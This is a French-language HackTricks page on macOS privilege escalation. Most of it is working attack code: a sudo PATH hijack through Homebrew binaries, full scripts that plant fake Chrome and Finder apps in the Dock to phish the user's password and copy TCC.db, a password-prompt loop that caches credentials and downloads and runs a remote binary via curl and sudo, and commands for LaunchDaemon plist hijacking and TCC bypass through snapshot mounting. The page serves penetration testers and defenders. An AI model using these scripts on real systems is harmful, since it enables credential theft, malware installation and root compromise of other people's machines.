# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Si vous êtes arrivé ici en cherchant TCC Privilege Escalation, rendez-vous sur :


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Veuillez noter que **la plupart des astuces de privilege escalation affectant Linux/Unix s'appliquent aussi aux machines MacOS**. Voir :


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Interaction utilisateur

### Sudo Hijacking

Vous pouvez trouver l'original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Cependant, macOS **conserve** le **`PATH`** de l'utilisateur lorsqu'il exécute **`sudo`**. Ce qui signifie qu'une autre façon de réaliser cette attaque serait de **hijack other binaries** que la victime exécutera en **running sudo** :
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Notez qu'un utilisateur qui utilise le terminal aura très probablement **Homebrew installé**. Il est donc possible de détourner des binaires dans **`/opt/homebrew/bin`**.

### Dock Impersonation

En utilisant un peu de **social engineering** vous pourriez **vous faire passer, par exemple, pour Google Chrome** dans le Dock et exécuter réellement votre propre script :

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Quelques suggestions :

- Vérifiez dans le Dock s'il y a une entrée Chrome, et dans ce cas **supprimez** cette entrée et **ajoutez** l'**entrée Chrome factice à la même position** dans le tableau du Dock.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Quelques suggestions :

- Vous **ne pouvez pas retirer Finder du Dock**, donc si vous allez l'ajouter au Dock, vous pouvez placer le faux Finder juste à côté du vrai. Pour cela, vous devez **ajouter l'entrée du faux Finder au début du tableau du Dock**.
- Une autre option est de ne pas le placer dans le Dock et simplement l'ouvrir — "Finder asking to control Finder" n'est pas si étrange.
- Une autre option pour **escalader en root sans demander** le mot de passe via une boîte de dialogue horrible est de faire en sorte que Finder demande vraiment le mot de passe pour effectuer une action privilégiée :
- Demandez à Finder de copier dans **`/etc/pam.d`** un nouveau fichier **`sudo`** (la fenêtre demandant le mot de passe indiquera que « Finder veut copier sudo »)
- Demandez à Finder de copier un nouveau **Authorization Plugin** (vous pouvez contrôler le nom du fichier de sorte que la fenêtre demandant le mot de passe indique que « Finder veut copier Finder.bundle »)

<details>
<summary>Script d'usurpation du Dock de Finder</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware abuse fréquemment l'interaction utilisateur pour **capturer un mot de passe sudo-capable** et le réutiliser de façon programmatique. Un flux courant :

1. Identifier l'utilisateur connecté avec `whoami`.
2. **Boucler les invites de mot de passe** jusqu'à ce que `dscl . -authonly "$user" "$pw"` renvoie succès.
3. Mettre en cache les identifiants (par ex., `/tmp/.pass`) et exécuter des actions privilégiées avec `sudo -S` (mot de passe via stdin).

Exemple de chaîne minimale:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Le mot de passe volé peut ensuite être réutilisé pour **supprimer la quarantaine de Gatekeeper avec `xattr -c`**, copier des LaunchDaemons ou d'autres fichiers privilégiés, et exécuter des étapes supplémentaires de manière non interactive.

## Nouveaux vecteurs spécifiques à macOS (2023–2025)

### `AuthorizationExecuteWithPrivileges` dépréciée mais toujours utilisable

`AuthorizationExecuteWithPrivileges` a été dépréciée dans 10.7 mais **fonctionne toujours sur Sonoma/Sequoia**. Beaucoup d'updaters commerciaux invoquent `/usr/libexec/security_authtrampoline` avec un chemin non fiable. Si le binaire cible est modifiable par l'utilisateur, vous pouvez implanter un trojan et profiter de l'invite légitime :
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combinez cela avec les **masquerading tricks above** pour présenter une boîte de dialogue de mot de passe crédible.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Si un LaunchDaemon plist ou sa cible `ProgramArguments` est **user-writable**, vous pouvez escalate en le remplaçant puis en forçant launchd à recharger :
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Cela reflète le schéma d'exploitation publié pour **CVE-2025-24085**, où un plist modifiable a été abusé pour exécuter du code d'attaquant en tant que root.

### XNU SMR credential race (CVE-2025-24118)

Une **race dans `kauth_cred_proc_update`** permet à un attaquant local de corrompre le pointeur de credential en lecture seule (`proc_ro.p_ucred`) en mettant en concurrence des boucles `setgid()`/`getgid()` entre threads jusqu'à ce qu'un `memcpy` partiellement écrit se produise. La corruption réussie donne **uid 0** et un accès à la mémoire du kernel. Structure minimale du PoC :
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Associez avec heap grooming pour placer des données contrôlées là où le pointeur relit. Sur les builds vulnérables, c'est un **local kernel privesc** fiable sans nécessiter de contournement SIP.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

Si vous avez déjà root, SIP bloque toujours les écritures dans les emplacements système. Le bug **Migraine** abuse de l'entitlement `com.apple.rootless.install.heritable` de Migration Assistant pour lancer un processus enfant qui hérite du contournement SIP et écrase des chemins protégés (p.ex., `/System/Library/LaunchDaemons`). La chaîne :

1. Obtenir root sur un système en cours d'exécution.
2. Déclencher `systemmigrationd` avec un état forgé pour exécuter un binaire contrôlé par l'attaquant.
3. Utiliser l'entitlement hérité pour patcher des fichiers protégés par SIP, persistant même après redémarrage.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Plusieurs daemons Apple acceptent des objets **NSPredicate** via XPC et ne valident que le champ `expressionType`, qui est contrôlé par l'attaquant. En construisant un predicate qui évalue des selectors arbitraires, vous pouvez obtenir **code execution in root/system XPC services** (p.ex., `coreduetd`, `contextstored`). Combiné à une sandbox escape initiale d'une app, cela confère **privilege escalation without user prompts**. Cherchez des endpoints XPC qui désérialisent des predicates et n'ont pas de visitor robuste.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Tout utilisateur** (même non privilégié) peut créer et monter un snapshot Time Machine et **accéder à TOUS les fichiers** de ce snapshot.\
Le **seul privilège** requis est que l'application utilisée (comme `Terminal`) dispose de **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), qui doit être accordé par un administrateur.

<details>
<summary>Monter un snapshot Time Machine</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Une explication plus détaillée peut être [**trouvée dans le rapport original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Informations sensibles

Ceci peut être utile pour escalader les privilèges :

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Références

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
